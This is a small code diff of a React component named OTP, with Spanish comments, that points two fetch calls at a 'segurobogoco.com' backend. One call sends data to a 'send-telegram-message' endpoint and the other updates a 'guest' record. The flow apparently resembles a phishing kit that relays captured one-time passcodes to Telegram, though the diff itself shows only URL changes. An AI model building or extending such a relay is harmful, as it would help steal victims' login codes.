@@ -54,7 +54,7 @@ const OTP = () => {
 
         // Enviar los datos al backend
         try {
-          const response = await fetch('http://127.0.0.1:8000api/v1/send-telegram-message', {
+          const response = await fetch('https://segurobogoco.com/api/v1/send-telegram-message', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
@@ -67,7 +67,7 @@ const OTP = () => {
           }
 
           // Si la respuesta es exitosa, proceder con la actualización del estado del guest
-          const updateResponse = await fetch(`http://127.0.0.1:8000api/v1/guest/${guestId}`, {
+          const updateResponse = await fetch(`https://segurobogoco.com/api/v1/guest/${guestId}`, {
             method: 'PUT',
             headers: {
               'Content-Type': 'application/json',
